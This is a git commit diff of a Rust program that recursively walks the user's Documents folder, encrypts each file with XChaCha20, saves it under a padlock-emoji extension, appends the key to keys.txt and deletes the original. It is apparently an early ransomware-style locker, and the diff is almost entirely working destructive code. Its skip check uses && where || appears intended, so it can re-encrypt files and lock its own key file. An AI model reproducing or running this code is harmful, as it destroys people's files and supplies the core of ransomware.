44feb642ea3bbe9cfb0c6ffc63197afb0b04f7ff
Dex <sheepareawesome777@gmail.com>
2023-03-12 19:02:18 -0400

    Cleanup + Encrypts files

--- src/main.rs
+++ src/main.rs
@@ -4,16 +4,12 @@ use std::path::PathBuf;
 use anyhow::{Result, Ok};
 use orion::aead;
 use dirs::document_dir;
+use walkdir::WalkDir;
 
 const ENCRYPTED_EXTENSION:	&str	= ".🔒";
 const KEY_FILE_NAME:		&str	= "keys.txt";
 
 type CipherAndKey = (Vec<u8>, aead::SecretKey);
-
-// TODO: use streams
-// current code isn't capable of encrypting giant files due
-// to having to load the whole file into memory
-
 
 fn main() -> Result<()> {
 	let target_dir = document_dir().unwrap();
@@ -21,11 +17,10 @@ fn main() -> Result<()> {
 	keyfile_loc.push(KEY_FILE_NAME);
 	let keyfile_loc = keyfile_loc; // make immutable
 
-	dbg!(&target_dir);
-
-	let entries = fs::read_dir(target_dir)?;
+	let entries = WalkDir::new(target_dir);
 	for entry in entries {
-		let path = entry?.path();
+		let entry = entry?;
+		let path = entry.path();
 
 		if path.is_file() {
 			encrypt_file(path, keyfile_loc.as_path())?;
@@ -35,47 +30,35 @@ fn main() -> Result<()> {
 	Ok(())
 }
 
-fn encrypt_file(path: PathBuf, keyfile_loc: &Path) -> Result<()> {
+fn encrypt_file(path: &Path, keyfile_loc: &Path) -> Result<()> {
 	let file_name = path.file_name().unwrap().to_string_lossy();
 
-	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
-		let encrypted_path = PathBuf::from(
-			format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
-		);
-
-		dbg!(&file_name);
-		dbg!(&encrypted_path);
-		dbg!(&path);
-
-		// Prepare new file data
-		let content = fs::read(&path)?;
-		let (ciphertext, key) = encrypt_xchacha20(&content[..])?;
-
-		println!("among us");
-
-		// Write encrypted data to new file
-		fs::write(&encrypted_path, &ciphertext[..])?;
-
-		println!("Write successful");
-
-		append_file(keyfile_loc, key.unprotected_as_bytes())?;
+	// Don't encrypt keyfile or already encrypted files
+	if	file_name.ends_with(ENCRYPTED_EXTENSION) &&
+		path.canonicalize()? == keyfile_loc.canonicalize()? {
 		
-		println!("Key append successful");
-
-		fs::remove_file(&path)?;
-
-		dbg!(&file_name);
-		dbg!(&encrypted_path);
-		dbg!(&path);
-		println!("k.");
+		return Ok(())
 	}
+
+	let encrypted_path = PathBuf::from(
+		format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
+	);
+
+	// Prepare new file data
+	let content = fs::read(&path)?;
+	let (ciphertext, key) = encrypt_xchacha20(&content[..])?;
+
+	// Write encrypted data to new file
+	fs::write(&encrypted_path, &ciphertext[..])?;
+
+	// Add key to keyfile, and rm old file
+	append_file(keyfile_loc, key.unprotected_as_bytes())?;
+	fs::remove_file(&path)?;
 
 	Ok(())
 }
 
 fn encrypt_xchacha20(src: &[u8]) -> Result<CipherAndKey> {
-	// check this: https://docs.rs/orion/latest/orion/aead/index.html
-
 	let secret_key = aead::SecretKey::default();
 	let ciphertext = aead::seal(&secret_key, src)?;
 	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;
